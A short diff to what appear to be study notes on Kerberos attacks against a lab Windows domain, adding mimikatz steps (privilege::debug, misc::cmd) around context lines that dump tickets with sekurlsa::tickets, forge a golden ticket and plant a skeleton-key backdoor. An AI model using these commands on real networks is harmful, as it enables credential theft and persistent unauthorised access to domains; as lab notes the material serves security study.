@@ -61,6 +61,10 @@ Rubeus.exe asreproast
 
 dumps tickets containing the hashes hashes for all accounts:
 
+mimikatz.exe
+
+privilege::debug
+
 sekurlsa::tickets /export
 
 Impersonate their tickets
@@ -77,5 +81,6 @@ Kerberos::golden /user:<username> /domain:controller.local /sid:<SID> /krbtgt:<N
 
 Create a backdoor
 
+misc::cmd
 misc::skeleton
 ```
